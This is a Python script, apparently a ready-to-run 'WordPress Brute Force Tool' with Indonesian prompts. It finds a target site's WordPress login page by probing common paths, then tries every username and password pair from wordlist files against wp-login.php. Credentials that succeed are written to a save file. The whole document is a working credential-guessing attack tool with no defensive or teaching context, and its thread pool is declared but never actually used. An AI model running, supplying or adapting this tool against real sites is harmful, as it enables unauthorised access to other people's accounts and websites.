import requests
import time
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Configuration
USERNAME_FILE = "username.txt"
PASSWORD_FILE = "password.txt"
SAVE_FILE = "urlsave.txt"
MAX_THREADS = 15
TIMEOUT = 7

# Common WordPress login paths (ordered by probability)
WP_LOGIN_PATHS = [
    "/wp-login.php",
    "/wp-admin",
    "/login",
    "/admin",
    "/dashboard",
    "/wordpress/wp-login.php",
    "/wp/wp-login.php",
    "/cms/wp-login.php",
    "/blog/wp-login.php"
]

def clear_screen():
    """Clear terminal screen"""
    print("\033c", end="")

def detect_wp_login(base_url):
    """Intelligent WordPress login page detection"""
    for path in WP_LOGIN_PATHS:
        test_url = f"{base_url.rstrip('/')}{path}"
        try:
            response = requests.head(test_url, timeout=TIMEOUT, allow_redirects=True)
            
            # Check for WordPress indicators
            if response.status_code == 200:
                final_url = response.url.lower()
                if any(x in final_url for x in ["wp-login", "wp-admin", "login"]):
                    return response.url
                
                # Additional check for WordPress content
                if "wp-content" in requests.get(test_url, timeout=TIMEOUT).text.lower():
                    return test_url
                    
        except requests.RequestException:
            continue
    
    return None

def brute_force(target, username, password):
    """WordPress login brute force"""
    try:
        session = requests.Session()
        response = session.post(
            target,
            data={
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": target.replace("wp-login.php", "wp-admin/")
            },
            timeout=TIMEOUT,
            allow_redirects=False
        )
        
        # Success detection (302 redirect to wp-admin)
        if response.status_code == 302 and "wp-admin" in response.headers.get('Location', ''):
            with open(SAVE_FILE, "a") as f:
                f.write(f"{target}|{username}:{password}\n")
            print(f"[ {Fore.GREEN}success{Style.RESET_ALL} ] {target} {username}:{password}")
            return True
        else:
            print(f"[ {Fore.RED}gagal{Style.RESET_ALL} ] {target} {username}:{password}")
            return False
            
    except Exception:
        print(f"[ {Fore.RED}error{Style.RESET_ALL} ] {target} (connection failed)")
        return False

def main():
    clear_screen()
    print(f"\n{Fore.GREEN}=== WordPress Brute Force Tool ==={Style.RESET_ALL}\n")
    
    # Get target URL
    base_url = input("Masukkan URL target: ").strip()
    if not base_url.startswith(('http://', 'https://')):
        base_url = f"http://{base_url}"
    
    # Auto-detect login page
    print("\n[ * ] Mencari halaman login WordPress...")
    login_url = detect_wp_login(base_url)
    
    if not login_url:
        print(f"\n[ {Fore.RED}gagal{Style.RESET_ALL} ] Tidak dapat menemukan halaman login WordPress")
        return
    
    print(f"[ {Fore.GREEN}found{Style.RESET_ALL} ] Login URL: {login_url}")
    
    # Load credentials
    try:
        usernames = [u.strip() for u in open(USERNAME_FILE).readlines() if u.strip()]
        passwords = [p.strip() for p in open(PASSWORD_FILE).readlines() if p.strip()]
    except FileNotFoundError:
        print(f"\n[ {Fore.RED}error{Style.RESET_ALL} ] File username.txt atau password.txt tidak ditemukan")
        return
    
    print(f"[ * ] Memulai brute force dengan {len(usernames)} username dan {len(passwords)} password\n")
    
    start_time = time.time()
    success_count = 0
    
    # Start brute forcing
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        for username in usernames:
            for password in passwords:
                if brute_force(login_url, username, password):
                    success_count += 1
    
    # Show results
    elapsed = time.time() - start_time
    print(f"\n[ * ] Selesai dalam {elapsed:.2f} detik")
    
    if success_count == 0:
        print(f"\n[ {Fore.RED}result{Style.RESET_ALL} ] Anda tidak mendapatkan [ hasil 0 ]")
    else:
        print(f"\n[ {Fore.GREEN}result{Style.RESET_ALL} ] Selamat anda success [ hasil {success_count} ]")
    
    print(f"[ * ] Hasil disimpan di {SAVE_FILE}")

if __name__ == "__main__":
    main()
